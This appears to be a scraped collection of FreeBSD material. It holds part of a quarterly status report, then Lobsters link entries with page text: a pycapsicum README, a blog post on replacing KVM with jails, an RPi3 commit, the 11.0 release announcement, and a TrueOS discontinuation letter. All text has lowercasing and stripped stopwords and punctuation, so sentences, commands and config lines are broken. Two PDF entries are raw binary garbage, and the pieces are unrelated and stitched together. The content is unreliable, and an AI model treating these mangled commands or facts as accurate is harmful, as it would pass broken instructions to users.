reported issue appropriate channel worked glen barber brad davis improve new user information freebsdorg make easier new people get started freebsd find howto guide http wwwfreebsdfoundationorgfreebsdhowtoguides check interview bsdnow http supporting freebsd infrastructure provide hardware support freebsd infrastructure last quarter purchased brought two cavium thunderx machine build freebsd package set platform also purchased server help continuous integration effort freebsd advocacy education large part effort dedicated advocating project includes promoting work done others using freebsd producing advocacy literature teach people freebsd ease path starting freebsd contributing project attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation created new handout promote teachbsdorg http google summer code program http published julyaugust issue freebsd journal http wwwfreebsdfoundationorgpastissuesfreebsdandrtems also published monthly newsletter highlight work done support freebsd tell upcoming event provide information keep loop support freebsd project community http wwwfreebsdfoundationorgnewsandeventsnewsletter conference event freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project quarter sponsored andor attended following event texas linux fest july austin tx http eleventh hope july new york ny http hopenetindexhtml bsdcam august cambridge uk sponsor organizer participated http fosscon august philadelphia pa http fossconus womencourage september linz austria silver sponsor http womencourageacmorg snia storage developer conference september santa clara ca industry partner sponsor http wwwsniaorgeventsstoragedeveloper eurobsdcon freebsd developer summit september belgrade serbia silver sponsor http eurobsdcon involvement included held woman tech bof partnership acmw europe benedict organized eurobsdcon developer summit deb gave foundation update talk hiroki sato benedict reuschling joined q session kirk mckusick taught twoday freebsd tutorial http kirkmckusick george nevilleneil taught tutorial tracing freebsd devops developer http georgenevilleneil george also gave keynote talk titled coming decade bsd phillip paeps one primary organizer conference openzfs developer summit september san francisco ca silver http openzfsorgwikiopenzfsdevelopersummit sponsored three freebsd contributor attend eurobsdcon legalfreebsd ip foundation owns freebsd trademark responsibility protect continued review request grant permission use trademark freebsd community engagement anne dickison marketing director overseeing effort rewrite project code conduct help make safe inclusive welcoming community stuff welcomed kylie liang philip paeps board director information interview found http wwwfreebsdfoundationorgblogfreebsdfoundationwelcomesnewboardmembers george attended arm partner meeting cambridge contact allan jude allanjude freebsdorg contact baptiste daroussin bapt freebsdorg contact conrad meyer cem freebsdorg contact ed maste emaste freebsdorg contact mariusz zaborski oshogbo freebsdorg several developer undertaken recent effort sandbox additional application base system work proceeding nicely one goal target basic utility used security sensitive application like freebsdupdate portsnap work highlighted two longstanding challenge applying capsicum first number common construct shared many simple program limiting capability right stdio file descriptor address set capsicum helper routine added common case second common challenge occurs application need open arbitrarily large number file possibly various directory preopening file descriptor may suitable several possible solution discussion recently capsicumized utility include bspatch cmp ident prime tee tr write additional capsicum change review uudecode uuencode brandelf dmamboxcreate file head hexdump iconv ident jot ktrdump lam last ministat praudit string additional syscall getdtablesize additional sysctls kernprocnfds kernhostname etc permitted capability mode capability right propagated child descriptor accept capsicum enabled compatibility syscall layer perprocess procctl global sysctl setting added aid debugging capsicumizing existing application enabled instead returning enotcapable ecapmode system call kernel issue sigtrap generate core dump enter debugger project sponsored dell emc isilon scaleengine inc freebsd foundation contact oleg ginzburg olevole olevoleru currently freebsd well proven base router pfsense opnsense bsdrp na freenas zfsguru however freebsdbased solution almost completely absent virtualization area clonos one attempt change clonos new free opensource freebsdbased platform virtual environment creation management core platform freebsd host o bhyve xen vale jail cbsd management tool puppet configuration management additional feature gomicro service obtaining vms resizing disk open task would like see clonos realworld use regard interested finding people company use freebsd hosting task addition could great work developer existing na solution zfsguru contact ed schouten ed freebsdorg contact cloudabi mailing list cloudabidevel googlegroupscom cloudabi compact unixlike runtime environment inspired freebsd capsicum security framework allows safely run potentially untrusted program directly top freebsd linux macos without requiring use virtualisation jail etc make useful building block clustercloud computing last couple month several new library application ported cloudabi important addition python mean write strongly sandboxed apps python support different hardware platform also improved addition support release llvm important u integrated necessary change support first three platform full support still blocked issue llvm linker lld project sponsored nuxi netherlandsopen task play around cloudabi let u know think full support part freebsd support available head merged branch futureinterested python programming give copy python try share experience maintain piece software could benefit strong sandboxing try building using cloudabi cross compiler contact alexander motin mav freebsdorg nontransparent bridge allow creation memory window different system using regular pcie link cpu transport last quarter ntb subsystem gained significant set improvement fix code modularized utilizing freebsd newbus interface allow support different hardware type different driver support multiple ntb instance system using ntbtransport module consumer ifntb etc support splitting ntb resource different application added direct access range remote memory virtual network interface node time etc virtual network interface driver gained support many modern feature multiple queue new locking etc ntb performance smp scalability improved multiple workarounds hardware issue added code committed freebsd head branch project sponsored ixsystems incopen task support next generation intel hardwaresupport nonintel hardware amd plx etc support ioat dma offloadscreating efficient packet transport protocolcreating greater variety ntb application contact freebsd graphic team freebsdorg contact matthew macy mmacy nextbsdorg contact johannes lundberg mecom sad report gsoc project failed libdevq project abandoned student disappeared kernel project incomplete student could work personal reason plan resume work complete task even though gsoc finished xorg server version update ddx driver ready wider testing cft sent shortly update required use newer drm version missing functionality libdrm needed amdgpu driver added change committed port tree shortly xorgserver update drm linux ported drmnext branch branch used radeon amdgpu card branch used card due instability intel driver drmnext branch johannes lundberg working getting wayland environment running freebsd wayland port working state except weston compositor current weston port dragonflybsd might scrapped new port created scratch based upstream source code use libinput libudevdevd epollshim diff large easier maintain patch wlc another wayland compositor pushed upstream todo list refactoring tty code selectable backends linux freebsd etc recommended author wlc running freebsd patch port tree contact ed maste emaste freebsdorg lld linker llvm family project highperformance linker support elf coff macho object format possible lld maintains commandline functional compatibility existing gnu bfd ld gold linkers however author lld constrained strict compatibility would hamper performance desired functionality compared gnu ld currently base system lld bring support link time optimization lto new abi support linker optimization much faster link time maintained code base upstream lld project implemented nearly functionality required link freebsd base system including kernel boot loader component rescue utility currently build lld project sponsored freebsd foundationopen task merge lld freebsd head part clang importrequest port exprun lld installed usrbinldfix building boot loader lldfix building rescue lldtest iterate making lld fix additional architecture contact liwen hsu lwhsu freebsdorg contact oleksandr tymoshenko gonzo freebsdorg freebsd provides api guest operating system access shared folder host kernel driver expose guest userland project aim add functionality virtualbox guest addition driver good progress made last month developer able mount filesystem readonly mode limitation readwrite mode implementation still lack critical piece roadmap clear open task finish missing piecesimplement proper lockinggeneral cleanup bugfixes contact alexander motin mav freebsdorg contact andriy gapon avg freebsdorg zfs code base freebsd regularly get merges new code staying sync latest openzfsillumos source among thing latest merge included following improvement arc mostly store compressed data stored disk decompressing demand store compressed data arc without recompression ram usage reduced largest size indirect block possible increased speculative prefetching indirect block performed improved ordering space allocation skein hashing algorithm supported contact vladimir kondratiev wulf cicgroupru contact oleksandr tymoshenko gonzo freebsdorg evdev portable apicompatible implementation linux devinputeventx interface cover wide variety input device like keyboard mouse touchscreen multitouch support support implemented lot existing userland component like qt libinput tslib evdev support started jakub klama google soc project later picked finished vladimir kondratiev general api evdev support bit ukbd ums committed head support also added ti touchstreen controller popular beaglebone based official touchscreen raspberry pi multitouch support raspberry pi successfully demonstrated using latest qt development branch open task documentation particular manual page needed kpisupport additional hardwareenable evdev support existing port add new evdevdependent port contact jan medala jan semihalfcom contact jakub palider jpa semihalfcom elastic network adapter ena smartnic developed annapurna lab based custom chip highperformance networking card available aws virtual machine introduces enhancement network utilization scalability machine running various operating system particular freebsd goal freebsd enablement provide top performance wide range monitoring management feature multiple queue mode various offload functionality admin queue asynchronous notification robust hardware access scalable number msix interrupt counter current state offer stable driver operation good performance machine running freebsd directly hardware project sponsored annapurna lab amazon companyopen task optimize performance virtualized environmentsprepare submitting driver phabricator review contact sepherosa ziehau sepherosa gmailcom contact hongjiang zhang honzhan microsoftcom contact dexuan cui decui microsoftcom contact kylie liang kyliel microsoftcom quarter hyperv storage driver greatly improved performance increased factor applying busdma unmapio enlarging request queue selecting outgoing channel lun considered trimunmap enabled critical bug pr fixed disk hot addremove vhdx online resizing work vmbus driver also received attention enhancement made handling device hot addremove hyperv network driver configurable r key dynamic mtu change supported freebsd image azure continue updated publishing freebsd vm image global microsoft azure june microsoft also published vm image microsoft azure operated china september patch developed support pcie passthrough also known discrete device assignment feature allows physical pcie device passed freebsd vms running hyperv window server giving nearnative performance low cpu utilization patch enable feature posted review soon project sponsored microsoft contact konstantin belousov kib freebsdorg work done properly lock timekeeping code existing code correctly interoperated reader kernel userspace giving lockless access actual data timehands needed derive time day timecounter hardware presence updaters update timehands performed periodic clock interrupt ntpddriven sysntpadjtime syscall settimeofday syscall pps sync possibly source coordinated moreso ntp code locked giant really serve purpose result work locking applied ensure timehands adjustment performed single mutator interesting case parallel modification timehands top kernel instance settimeoday syscall simultaneous clock tick event syscall already acquired resource case highly desirable block spin tick handler required adjustment performed already executing call top half typical trylock operation desired surprisingly lacking spinlock implementation mtxtrylockspin implemented used purpose userspace gettimeofday implementation enhanced allow syscallless operation machine use hpet hardware timecounters hpet algorithm coexists older rdtscbased code allowing dynamic switching timecounters page hpet register mmap ed readonly libc userland application program address space needed measurement demonstrated modest improvement gettimeofday performance unexpectedly even syscallless hpet timecounter slower invoking syscall rdtsc strictly intertwined related code timebound sleep implementation handling race callouts tophalf code set process timeouts depended many fine detail calloutstop kpi kernel programming interface particular race unpunctual kpi change usually result catchall unkillable thread state waitchain bug sleepqueue timeout code rewritten stop depending kpi detail removed source recurring bug also surprisingly simplified code project sponsored freebsd foundation contact gavin atkinson gavin freebsdorg contact pedro giffuni pfg freebsdorg previous edition google summer code freebsd accepted organization chance mentor project huge thanks mentor keeping high quality standard make community shine year rather unique accepted first time wellknown member community src committers comentor also accepted project different upstream freebsd clear sign freebsd growing adapting wider community year also administrative issue perforce officially accepted use external repository particular github requested student project successful think excellent result google summer code project sponsored google inc freebsd foundationopen task world changing need fresh project idea need start looking idea nowthe project idea wiki page reset need get populated applying next google summer code please help unleash next stream project want see freebsd contact mateusz piotrowski freebsdorg project started google summer code year aim create library convert audit trail file linux audit format format used window bsm format used freebsd audit log apart wanted create simple commandline tool extend auditdistd possible send nonbsm log secure connection save audit log disk preferably bsm format far possible reasonably convert common linux audit log event bsm still need lot work secondly able configure auditdistd communicate centos insecure connection thirdly commandline tool usable perfect present work focus configuring secure tl connection centos auditdistd already tried using rsyslogd able make work project sponsored google summer codeopen task need example rare linux audit log please send example much easier improve conversion process reallife example audit event write code convert themconfigure auditdistd able communicate software centos tl order receive audit log able come simple solution thatadditional open task listed wiki page todo file root directory project contact vincenzo maffione vmaffione gmailcom project provides new driver ifptnet paravirtualized network device modeled netmap api driver support multiqueue netmap port able work netmap mode normal mode emulation ptnet device model module bhyve hypervisor ptnet device driver introduced overcome performance limitation tcpip networking bhyve vms prior work performant solution vmtovm intrahost tcp communication provided le gbps tcp throughput ptnet vmtovm tcp communication scenario possible obtain gbps project sponsored google summer codeopen task share virtionet header management code ifvtnet driver current code line code copied pasted ifvtnetc contact jan medala jan semihalfcom contact michal stanek mst semihalfcom contact wojciech macek wma semihalfcom alpine family platformonchip device including multicore firstgen alpine alpine arm cpu developed annapurna lab primary focus area alpine platform highperformance networking storage embedded application network subsystem feature ethernet controller support virtualization loadbalancing hardware offload advanced feature basic patch set already committed head including pcie root complex support cache coherency unit driver north bridge service driver updated alpine hal extended msi support code additional work msix driver full ethernet support currently undergoing community review phabricator multiuser smp system stable fully working along ethernet link interrupt management code adjusted work new intrng framework project sponsored annapurna lab amazon company semihalf contact marcin wojtas mw semihalfcom contact bartosz szczepanek bsz semihalfcom freebsd includes support marvell platform tested improved order gain production quality effort invested development benchmarking onchip gigabit ethernet neta functionality numerous bug fix new feature introduced work completed quarter includes neta rework improvement enable multiport support pcie driver mvpcictrl introduce alternative coherent busdma arch ahci controller support sdhci controller support improve etherswitch driver fix marvell bus configuration numerous interface along support new board solidrun clearfog change submitted upstream project sponsored stormshield semihalfopen task finalize neta prepare submissionsubmit remaining fix driver contact andrew turner andrew freebsdorg contact jared mcneill jmcneill freebsdorg transparent superpage support added allows freebsd create block single pagetable tlb entry show small significant improvement buildworld time thunderx machine superpages enabled head merged disabled default due lack testing support preintrng interrupt framework removed mean requires intrng even build allowed various cleanup within driver interact interrupt controller cortex string library linaro imported part shown improvement previous c code attached libc build ongoing work add acpi support kernel thunderx freebsd get mountroot prompt however due incomplete acpi table external pcie support needed support netboot setup test cluster functional support committed head freebsd boot multiuser smp enabled includes support clock secure id controller usb host controller gpios nonmaskable interrupt power management unit cpu freqency voltage scaling mmc uart gigabit networking watchdog thermal sensor project sponsored freebsd foundation abt system ltd contact konstantin belousov kib freebsdorg uefi unified extensible firmware interface specifies two kind service use operating system boot service designed o loader load initialize kernel runtime service meant used kernel regular system operation boot runtime phase explicitly separated boot loader executed machine configuration owned uefi runtime kernel manages configuration need inform firmware change made model split bootruntime configuration make assumption o architecture quite apply existing freebsd codebase instance firmware notification future runtime configuration must done loader effectively still control technical term setvirtualaddressmap call must made physical virtual mapping system freebsd mean call issued loader loader need know intimate detail kernel address map provide requested information creates new unfortunate coupling loader kernel reading publicly available information m window boot process explained uefi control transfer model window loader construct address map kernel division work uefi model reasonable freebsd kernel construct address space relying minimal map constructed loader enough pmap subsystem bootstrap perform machine initialization common code initial experiment enabling runtime service centered around utilizing direct address map dmap currently always exists linearly map least lower physical address kva location supposed kernel would export dmap detail like linear base guaranteed size loader elf image provide needed overflow map dmap completely serve unfortunately two showstopper bug discovered approach first edkbased firmware apparently requires runtime mapping exists simultaneously physical mapping setvirtualaddressmap call second reference opensource project mentioning firmware required presence physical mapping runtime call effectively force kernel loader provide mapping runtime call restriction informing firmware detail kernel address space add useless work could easily establish physical mapping runtime get rid setvirtualaddressmap entirely approach coded kernel interface access runtime service based development particularly trying make loader modification quickly realized faultreporting facility loaderefi machine exception resulted silent hang curiously situation intel firmware output error code serial port setting regardless uefi console configuration discovered accident unfortunately error code alone enough diagnose problem primitive fault reporter written loaderefi intercept exception firmware idt dump machine state loader console due complexity interception possible bug might harm good dumper activated explicit administrator action note described work provides kernel interface make calling efi runtime service easy calling regular c function uservisible feature development making use new interface performed right project sponsored freebsd foundation contact kde freebsd team kde freebsdorg kde freebsd team focus packaging kde software making sure experience kde qt freebsd good possible following big update landed port tree quarter added option multimediamlt added port usesgrantleemk added port added port cmake updated version important fix made qmake clang version correctly detected qt committed port phonon backend updated preparation qt updated port various libressl related fix matthew rezny replaced useskdemk fixed depend system leveldb development repository done work branch kept date kde upstream contains port framework plasma desktop application contact olivier duchateau olivierd freebsdorg contact jesper schmitz mouridsen jesper schmitzcomputer lxqt qt port upcoming version lxde lightweight desktop environment product merge lxdeqt razorqt project porting effort remains much work progress requires component plasma new major kde workspace porting branch complete new port compared previous release see wiki page complete list application also update open task improve freebsd support sysutilslxqtadmin especially respect user managementadd additional panel plugins contact freebsd xfce team xfce freebsdorg xfce free software desktop environment unix unixlike platform freebsd aim fast lightweight still visually appealing easy use quarter team kept application uptodate audioxfmpc develthunarvcsplugin metaport goody project plugins application also follow unstable release current unstable release brings support available experimental repository sysutilsgarcon currently unstable release work fine port available port tree future support removed preference open task continue working unstable release contact sevan janiyan sevan freebsdorg eurobsdcon began looking inconsistency within component inside family operating system workflow consisted reading documentation given utility checking history revision control system missing fix functionality tree netbsd freebsd openbsd dragonfly bsd one thing became obvious quickly inconsistency operating system andor version utility originated despite common heritage began working man page freebsd verifying detail page already history section making patch change propogated netbsd openbsd dragonfly bsd applicable utility originated source implementation example good exercise becoming familiar mandoc using tool linting functionality mandoc igor documentation script becoming familiar location thing documented external source historical information bsd family tree included freebsd base system project like unix heritage society manual library catvorg host copy manual shipped research unix manual commonly available elsewhere open task cover remaining manual userland utility maybe expand library syscall apis though say without estimating feasibility history component originating closedsource operating system tricky document since older version always availablenews home status home
510,Lobsters,freebsd,FreeBSD,pycapsicum - sandbox your Python code on FreeBSD,https://github.com/stillson/pycapsicum2,pycapsicum sandbox python code freebsd,pycapsicum api,pycapsicum pycapsicum python interface capsicum sandboxing freebsd work earlier version support would recommend understand capsicum c using module simple system understand api quick demo import pycapsicum p get fileno tmp popendir tmp rw enter capability mode penter create new caprights object pcaprights use openat open file tmp x popenat foo rw x python file object xreadlines get capability x aget x print capabilites print acaps make new caprights set capread b pcaprights capread set capabilites x blimit x get capability x aget x print capread print acaps detail specific function see man page man page enter enter sandboxed mode sandboxed return true sandboxed mode false otherwise getmode like sandboxed cause exception error ioctlslimit fd cmdlist set ioctl limit fd see manpage capioctlslimit detail fd integer python file python socket object fileno method ioctlsget fd get ioctl limit fd see manpage capioctlsget detail fd integer python file python socket object fileno method fcntlslimit fd right set fcntls limit fd see manpage capfcntlslimit detail possible value right pycapsicumcapfcntlgetfl pycapsicumcapfcntlsetfl pycapsicumcapfcntlgetown pycapsicumcapfcntlsetown pycapsicumcapfcntlall set flag ed together fd integer python file python socket object fileno method fcntlsget fd get fcntls limit fd see manpage capfcntlsget detail fd integer python file python socket object fileno method openat fd path flag strictly cap related openat allows open file fd int opened directory flag either integer r w rw opendir path flag opendir allows get fd directory since standard python nt allow call open directory flag either integer r w rw caprights object class caprights object object encapsulates caprightst represents set capabilites init self capsnone called optional list capabilites initialize cap list human readable capability set caprights set self caplist set list capability object clear self caplist clear list capability object isset self caplist return true list capability set isvalid self return true set capabilites valid merge self othercr merge capability set othercr caprights remove self othercr remove capability set othercr caprights contains self othercr true caprights capability othercr limit self fd set capability caprights onto fd int file object socket object object fileno method get self fd get capability caprights fd int file object socket object object fileno method
511,Lobsters,freebsd,FreeBSD,Dropping Linux and KVM in Favor of FreeBSD and Jails (2015),http://www.jasonvanpatten.com/2015/12/04/dropping-linux-and-kvm-in-favor-of-freebsd-and-jails/,dropping linux kvm favor freebsd jail,joker riddler clayface penguin love freebsd hypervisor bhyve need hypervisor joker riddler clayface penguin joker get rebuilt joker ffmpeg trouble paradise storage server system first boot install joker networking switch server dual homed joker filesystem setup package joker joker neal spamilter nfs mount post note user management jail public facing service prep config file joker riddler get filesystems ready bane start jail continued,mentioned previously service run house via virtual machine long using vmware esxi got tired stupid window admin tool also tired restriction hardware would run mac pro replaced xeon cpu something faster added bunch ram packed full disk previously using edit photo video upgraded system something much faster reassigned mac pro server duty installed centos taught drive kvm moved vms ran well probably would still running well today vm joker vm email server riddler vm teamspeak server running gaming clan clayface vm website working penguin vms freebsd except teamspeak one plan convert one love freebsd hypervisor really wanted convert mac pro freebsd run hypervisor problem kvm longer supported hypervisor choice freebsd bhyve suboptimal intention ever run freebsd vms may decentenough solution add linux vm thing get ugly quick multistage configuration boot process linux vm opposed something like kvm spin vm start loading whatever disk image appears conscious decision bhyve developer fine pas need hypervisor main vm joker running local service thing used like imap server ssh login lot antispam fighting etc everything else running one process riddler sendmail clayface teamspeak server penguin apache need vms answer process thrown jail set install freebsd mac pro failed every attempt boot freebsd installer thumb drive met complete failure nothing would make mac boot decided retire mac build new machine joker get rebuilt decided go somewhat allout new server build also decided call joker continue using general stuff former vms would end jail likely add couple figured use two rpm wd sata drive mirror make machine zroot four drive would put together volume used local much hardware money spent intention leave one alone long time leave running long time xeons superfast processor bit reliable core consumer chip meant server chip using also video processing via command line wonderful application called ffmpeg benefit large number cpu core chip meaning total core including hyperthreading ultimately really justify anyone going trouble paradise mentioned storage server post fan supermicro motherboards server duty fair ever put supermicro chassis first attempt put one someone else chassis supermicro claim board eatx sized assumption say also standoff hole eatx board one think corner given motherboard external input device connect entire corner unsupported standoff hole line eatx chassis standoff hole line anything chassis know supermicro fault also big fan cooler master chassis mess stuff like say motherboard standoff better fortunately make enough difference matter motherboard would standing end inside chassis meaning corner much mass since motherboard headless toss old nvidia video card ended serving another anchor board pair intel pcie gige nics rest standoff worked perfectly board secured case stable enough even mass cpu respective heat sink fan attached system first boot install damn good mean really good done many time system booted right beeped time motherboard realized cpu contend rebooted couple time came right bios set date time told boot usb thumb drive away went like installed na freebsd install took minute told installer create zroot install mirroring drive together installed base source document package thumb drive like na also bother letting installer worry networking creating couple lagg interface finished soon enough system new joker born networking switch outlined na post managed cisco switch sits server basement support bundling also support vlans serverbased blog post config switch interface might interest interface description joker channelgroup mode auto interface description joker channelgroup mode auto interface description joker channelgroup mode auto interface description joker channelgroup mode auto interface description joker switchport mode access switchport access vlan interface description joker switchport mode access switchport access vlan server motherboard intel gige interface showed addin pcie nics bundled guy different laggs etcrcconf clonedinterfaces create configure actual laggs public inet laggproto lacp laggport laggport redacted prefixlen defaultrouter redacted private inet laggproto lacp laggport laggport redacted prefixlen couple command make sure took service netif restart service routing restart joker ping ping data byte byte m byte m byte m byte m byte m c ping statistic packet transmitted packet received packet loss roundtrip minavgmaxstddev m joker ping ping data byte byte m byte m byte m byte m byte m c ping statistic packet transmitted packet received packet loss roundtrip minavgmaxstddev m dual homed consciously carefully dualhome joker know security risk normally recommend folk server confident enough security around joker concerned would recommend unless know trust security filesystem setup remember mentioning drive zpool create local mirror mirror afterward joker zpool status local pool local state online scan none requested config name state read write cksum local online online online online online online online error known data error joker df local filesystem size used avail capacity mounted local local intent make usrlocal actually point local run pkg command prior making local zpool usrlocal already stuff simple address cd usrlocal tar xf cd local tar xpvf cd rm rf local ln sf local done joker cd usrlocal joker df filesystem size used avail capacity mounted local local package course using joker freebsd virtual machine built list package needed installed bind apache php sendmail etc bore complete list suffice say used pkg command new joker quickly add long sendmail neal spamilter running dovecot imap mail retrieval bind name resolution internally externally along service course locked sshd respond password ssh key nfs mount also followed client step post get joker mount bane exported filesystem opt mounted softlinked home added local user along others joker etcpasswd file note user management going rant bit user management unix unixlike operating system familiar script root user run add delete change user attribute one common thing see automatically making uid gid user exists server also exists matching group ask concern resource wasting whatnot ask group call stupidusers ie nonroot gid kinda group every single system administrator better feel comfortable confident editing etcpasswd tool vipw also able edit etcgroup without fear without fucking something sysad either afraid step away keyboard seriously simple skill must understand hair breadth away replaced shell script never use silly script first thing edit group file find unused gid create user group edit passwd file vipw add user uid use one since aol day yes still remember gid one created user get saved without password immediately fix passwd command thing able stop using stupid script folk writing stop writing beginner disservice never learn joy screwing system editing etcpasswd fix opinion back story jail public facing service prep config file joker running way wanted needed get former riddler virtual machine built jail reasonably quickly otherwise able send outbound mail exercise worked physical machine even built ready etcjailsconf file could build filesystems new machine start jail go file execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs mountfdescfs mountprocfs allowrawsockets path localjails name riddler outbound smtp auth riddler hosthostname riddlerlateapexnet redacted penguin penguin hosthostname penguinlateapexnet redacted clayface clayface hosthostname clayfacelateapexnet redacted catwoman catwoman hosthostname catwomanlateapexnet redacted scarecrow scarecrow hosthostname scarecrowlateapexnet redacted know silly try censor ip address reading blog actually connected one astute reader able figure one ip address actually get filesystems ready read plenty guide suggestion combining readonly section bunch jail usr filesystems single directory seems like waste time opinion skipped created new zfs filesystems local zfs create localjails zfs create localjailsriddler zfs create localjailsscarecrow zfs create localjailsclayface zfs create localjailscatwoman zfs create localjailspenguin directory usrfreebsddist installation medium two file knew referencing jail copied localjails base directory way handy needed create another jail future installation medium mounted speaking installation medium opt nfsmounted bane directory called iso mount mediafreebsd copy required file mount dev mdconfig vnode f mediafreebsd cp mediafrebsdusrfreebsddistbasetxz localjails cp mediafrebsdusrfreebsddistsrctxz localjails umount mediafreebsd basetxz srctxz local filesystem upgrade newer version freebsd easily replace file build jail simple step take bit time localjails directory tar xpvf basetxz c scarecrow tar xpvf basetxz c catwoman tar xpvf basetxz c clayface tar xpvf basetxz c penguin tar xpvf basetxz c riddler tar xpvf srctxz c riddler start jail add following etcrcconf get jail going jailenable yes fire service jail start jail running nothing syslogging joker jls jid ip address hostname path clayfacelateapexnet localjailsclayface riddlerlateapexnet localjailsriddler penguinlateapexnet localjailspenguin catwomanlateapexnet localjailscatwoman scarecrowlateapexnet localjailsscarecrow continued getting bit longwinded going stop continue another post soon stay tuned
512,Lobsters,freebsd,FreeBSD,FreeBSD adds initial RPI3 64-bit support,https://svnweb.freebsd.org/changeset/base/307257,freebsd add initial support,http githubcomraspberrypifirmwaretreemasterboot,log message add initial raspberry pi support kernel config build kernel compatible latest upstream device tree firmware http githubcomraspberrypifirmwaretreemasterboot today default console dt overlay configured configtxt stock uboot patched use proper serial port yet unsupported smp vchiq rng driver rng requires work due upstream device tree incompatibility multiple people contributed work time db loo manu
513,Lobsters,freebsd,FreeBSD,FreeBSD 11.0-RELEASE officially available,https://www.freebsd.org/releases/11.0R/announce.html,freebsd officially available,freebsd announcement important note upgrading freebsd upgrading freebsd earlier dedication availability http ftp support acknowledgment cperciva freebsdorg trademark iso image checksum powerpc bananapi beaglebone cubieboard cuboxhummingboard gumstix rpib pandaboard wandboard virtual machine disk image checksum donation,freebsd announcement freebsd release engineering team pleased announce availability freebsd first release branch highlight openssh dsa key generation disabled default important update openssh key prior upgrading additionally protocol support removed openssh updated additional wireless support added several driver default ifconfig utility set default regulatory domain fcc wireless interface result newly created wireless interface default setting le chance violate countryspecific regulation svnlite utility updated version libblacklist library application ported netbsd project support architecture added native graphic support added bhyve hypervisor broader wireless network driver support added complete list new feature known problem please see online release note erratum list available information freebsd release engineering activity please see important note please note result timing withdrawn freebsd image available official announcement several lastminute issue discovered uname display freebsd image generated patchlevel revision branch user installed freebsd image originally available mirror freebsdupdate prior rebuild final release urged upgrade system freebsd immediately user upgrading system source code use revision user upgrading freebsdupdate follow instruction update system freebsd upgrading freebsd usrbinbspatch freebsdupdate fetch freebsdupdate install upgrading freebsd earlier usrbinbspatch freebsdupdate upgrade r freebsdupdate install reboot system freebsdupdate install rebuild thirdparty software freebsdupdate install user urged read erratum note freebsd regarding issue discovered late release cycle may cause system hang boot process upgrading previous freebsd version new installation affected existing installation running earlier release advised wait issue resolved erratum notice upgrading dedication freebsd project dedicates freebsd memory several member community stefan farfeleder juergen lock ben perrault paul schenkeveld volker werth may rest peace availability freebsd available powerpc architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded via ftp described section smaller ftp mirror may carry architecture generally contain common one hash release iso memory stick sd card image included bottom message pgpsigned checksum release image also available pgpsigned version announcement available purpose image provided part release follows contains everything necessary install base freebsd operating system documentation small set prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system also support booting livefs based rescue mode prebuilt package bootonly support booting machine using cdrom drive contain installation distribution set installing freebsd cd would need perform network based install eg ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct minimemstick written usb memory stick flash drive used boot machine contain installation distribution set medium similar bootonly image also support booting livefs based rescue mode prebuilt package one example use minimemstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsdarm sd card image written sd card used boot supported arm system sd card image contains full freebsd installation installed onto sd card small convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system write freebsdarm image sd card use dd utility replacing kernel appropriate kernel configuration name system dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product preinstalled virtual machine image also available architecture vhd vmdk disk image format well raw unformatted image freebsd also available cloud hosting platform amis available following region region region region region region region region region region region region amis also available marketplace http compute instance deployed using gcloud utility gcloud compute instance create instance image imageprojectfreebsdorgclouddev gcloud compute ssh instance replace instance name google compute engine instance instance deployed using vagrant utility vagrant init vagrant ftp freebsd may downloaded via ftp following site however trying site please check regional mirror first going additional mirror site labeled information freebsd mirror site found freebsd virtual machine image may downloaded via ftp instruction installing freebsd updating existing machine please see support based new freebsd support model freebsd release series supported least september first point release freebsd supported least three month freebsd additional support information found acknowledgment many company donated equipment network access manhours support release engineering activity freebsd including freebsd foundation yahoo netapp internet system consortium bytemark hosting sentex communication new york internet juniper network nlnet lab ixsystems yandex release engineering team includes special thanks colin percival cperciva freebsdorg assistance regenerating freebsdupdate build final release trademark freebsd registered trademark freebsd foundation iso image checksum powerpc bananapi beaglebone cubieboard cuboxhummingboard gumstix rpib pandaboard wandboard virtual machine disk image checksum love freebsd support future release donation freebsd foundation
514,Lobsters,freebsd,FreeBSD,Secure Virtual Architecture: Safe Execution for Commodity OS's (2007),http://llvm.org/pubs/2007-SOSP-SVA.pdf,secure virtual architecture safe execution commodity o,,obj stream u u uyn j l ee tsk k otp x ӯ e jzh fn f p r p spx
515,Lobsters,freebsd,FreeBSD,Nested Kernel - OS architecture for intra-kernel privilege separation (2015),http://nathandautenhahn.com/downloads/publications/asplos200-dautenhahn.pdf,nested kernel o architecture intrakernel privilege separation,,obj length filter flatedecode stream zi p婸d r mi nx ݾ wi u ey endstream endobj obj type objstm n first length filter flatedecode stream g g u
516,Lobsters,freebsd,FreeBSD,PC-BSD Evolves into TrueOS,https://www.trueos.org/2016/09/01/pc-bsd-evolves-into-trueos/,pcbsd evolves trueos,open letter trueos community trueos discontinuation truenas core,open letter trueos community trueos discontinuation hey trueos community wanted take minute address may already guessed heavy heart trueos core team decided discontinue development trueos foreseeable future still heavily involved open source project like freenas truenas core incredibly proud work put trueos predecessor pcbsd trueos source code remain available github others may want continue work started many year ago explain much appreciate loyal fan trueos pcbsd past confident even though hard decision also correct decision exciting new project becoming involved like truenas core question hesitate ask many thanks best wish joshua kris
